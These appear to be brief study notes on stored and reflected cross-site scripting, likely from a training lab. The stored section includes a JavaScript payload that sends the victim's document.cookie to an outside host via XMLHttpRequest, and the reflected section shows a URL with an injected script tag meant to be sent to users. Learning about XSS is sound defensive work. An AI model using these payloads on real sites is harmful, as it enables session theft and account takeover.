# XSS Types

## Persistent/Stored

- XSS is stored in the database

This is very useful for essentially getting other users to execute the script and dump some information for you

In javascript you can dump the cookies of the user using document.cookies

You can also make it so that the script can send information via http

``` html 

<script>
const Http = new XMLHttpRequest();
const url='http://10.10.233.236/log/' + document.cookie;
Http.open("GET", url);
Http.send();
```

Where the url is sending the cookie over an HTTP Get endpoint

## Reflected

The basics of reflected is to craft a malicious link that will be clicked on executed

For instance, some web pages when searching will utilize query strings on the same page and then execute them that way

```
http://10.10.233.236/reflected?keyword=Term%20from%20URL...
```

Keyword here represents the search term, here we can inject the malicious code once.

Once clicked, the script will be in the url bar an acted upon. With this we could send the link to a user and have it dump their info

```
http://10.10.233.236/reflected?keyword=<script>+alert('Hello')+<%2Fscript>
```
